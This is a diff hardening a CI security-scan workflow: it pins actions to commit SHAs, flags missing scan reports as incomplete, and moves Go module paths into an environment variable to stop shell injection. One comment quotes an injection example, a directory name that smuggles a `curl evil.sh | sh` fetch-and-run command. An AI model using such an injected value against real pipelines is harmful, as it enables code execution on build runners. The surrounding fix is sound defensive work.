@@ -19,6 +19,10 @@ name: security-scan
 # with no error rather than failing. Hosted minutes are already covered by the
 # plan's included allowance, so there is nothing to save by risking that.
 #
+# Actions are pinned to commit SHAs rather than @v4/@v5. A mutable tag can be
+# repointed upstream at any time, which silently changes executable CI code
+# without anything appearing in this repository's review history.
+#
 # Enforcement is split on purpose, based on what each scanner actually found at
 # rollout:
 #   gitleaks -- BLOCKING. Zero findings in the tracked history of every repo, so
@@ -63,7 +67,7 @@ jobs:
     runs-on: ubuntu-latest
     timeout-minutes: 10
     steps:
-      - uses: actions/checkout@v4
+      - uses: actions/checkout@11d5960a326750d5838078e36cf38b85af677262 # v4
         with:
           # Full history. A credential that was committed and then "removed" in
           # a later commit is still in the pack, still fetchable, and still
@@ -106,19 +110,30 @@ jobs:
           # on rule+path+line collapses those into one row so the count is the
           # number of secrets, not the number of detections.
           seen = {}
+          missing = []
           for name, path in (("history", "gitleaks-history.json"), ("worktree", "gitleaks-tree.json")):
               if not os.path.exists(path):
+                  missing.append(name)
                   continue
               try:
                   for f in json.load(open(path)) or []:
                       key = (f.get("RuleID", "?"), f.get("File", "?"), f.get("StartLine", "?"))
                       seen.setdefault(key, []).append(name)
-              except json.JSONDecodeError:
-                  pass
+              except (json.JSONDecodeError, OSError):
+                  missing.append(name)
           rows = [("+".join(scopes), k[0], k[1], k[2]) for k, scopes in seen.items()]
           print("## Secrets (gitleaks)\n")
-          if not rows:
+          # A scan that never produced a report is unknown, not clean. Saying
+          # "no secrets found" when the step died before writing anything is the
+          # one summary bug that could actually get a secret merged.
+          if missing:
+              print(f"**Incomplete: the {' and '.join(missing)} scan(s) produced no readable "
+                    f"report. This is NOT a clean result -- read the step logs above.**\n")
+          if not rows and not missing:
               print("No secrets found in tracked history or the working tree.")
+              raise SystemExit(0)
+          if not rows:
+              print("No secrets in the scans that did complete.")
           else:
               print(f"**{len(rows)} potential secret(s). Treat every one as live and rotate it "
                     f"before deciding it was a false positive.**\n")
@@ -133,9 +148,9 @@ jobs:
     runs-on: ubuntu-latest
     timeout-minutes: 20
     steps:
-      - uses: actions/checkout@v4
+      - uses: actions/checkout@11d5960a326750d5838078e36cf38b85af677262 # v4
 
-      - uses: actions/setup-python@v5
+      - uses: actions/setup-python@a26af69be951a213d495a4c3e4e4022e16d87065 # v5
         with:
           python-version: '3.12'
 
@@ -173,7 +188,11 @@ jobs:
           if not os.path.exists("semgrep.json"):
               print("semgrep produced no report -- check the step above.")
               raise SystemExit(0)
-          results = json.load(open("semgrep.json")).get("results", [])
+          try:
+              results = json.load(open("semgrep.json")).get("results", [])
+          except (json.JSONDecodeError, OSError) as e:
+              print(f"semgrep report unreadable ({e}). Advisory job; not failing the build.")
+              raise SystemExit(0)
           if not results:
               print("No findings.")
               raise SystemExit(0)
@@ -202,7 +221,7 @@ jobs:
     runs-on: ubuntu-latest
     timeout-minutes: 15
     steps:
-      - uses: actions/checkout@v4
+      - uses: actions/checkout@11d5960a326750d5838078e36cf38b85af677262 # v4
 
       # Finds go.mod anywhere, not just at the root. chaio-crewchief keeps its
       # module in gateway/, and a root-only `[ -f go.mod ]` check made this job
@@ -225,7 +244,7 @@ jobs:
           { echo 'dirs<<EOF'; echo "$DIRS"; echo 'EOF'; } >> "$GITHUB_OUTPUT"
           echo "Go modules found:"; echo "$DIRS"
 
-      - uses: actions/setup-go@v5
+      - uses: actions/setup-go@40f1582b2485089dde7abd97c1529aa768e1baff # v5
         if: steps.detect.outputs.go == 'true'
         with:
           go-version-file: ${{ steps.detect.outputs.first }}/go.mod
@@ -236,9 +255,18 @@ jobs:
 
       # One report per module, merged by the summary step. gosec cannot span
       # modules in a single invocation.
+      # The module list arrives through the ENVIRONMENT, never through a
+      # ${{ }} expression inside the script. GitHub substitutes expressions into
+      # the shell source as text before bash ever sees it, so a directory named
+      # `a"; curl evil.sh | sh; "` containing a go.mod would have been executed
+      # on the runner. This workflow triggers on `pull_request`, and
+      # chaio-crewchief is public, so any fork could have opened that PR.
+      # Environment variables are passed as data and cannot become syntax.
       - name: Run gosec
         if: steps.detect.outputs.go == 'true'
         continue-on-error: true
+        env:
+          GO_MODULE_DIRS: ${{ steps.detect.outputs.dirs }}
         run: |
           set -uo pipefail
           i=0
@@ -248,7 +276,7 @@ jobs:
             ( cd "$d" && gosec -quiet -fmt=json -out="${GITHUB_WORKSPACE}/gosec-${i}.json" ./... )
             echo "::endgroup::"
             i=$((i + 1))
-          done <<< "${{ steps.detect.outputs.dirs }}"
+          done <<< "$GO_MODULE_DIRS"
 
       - name: Summarise
         if: always() && steps.detect.outputs.go == 'true'
